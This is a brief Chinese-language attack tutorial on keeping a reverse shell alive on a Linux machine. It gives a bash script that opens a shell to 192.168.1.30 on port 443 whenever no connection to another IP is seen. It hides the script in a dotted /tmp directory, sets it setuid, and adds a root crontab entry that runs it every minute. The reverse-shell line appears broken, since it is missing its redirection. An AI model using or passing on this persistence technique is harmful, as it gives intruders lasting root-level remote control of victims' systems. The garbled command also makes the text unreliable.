反弹shell+计划任务
```
#!/bin/bash
if netstat -ano | grep -v grep | grep "106.52.199.83" > /dev/null
then
echo "OK" > /dev/null
else
bash -i /dev/tcp/192.168.1.30/443 0>&1
fi
```
chmod +sx /tmp/.../.shell.sh
然后我们需要修改一下 /etc/crontab 让它定时执行。

nano /etc/crontab     在 /etc/crontab 文件末加入这一行。代表每 1 分钟执行一次。
*/1 * * * * root /tmp/.../.shell.sh

最后重启一下 crond 的服务。（不同发行版重启方式不一样，自行查询）
service cron reload
service cron start
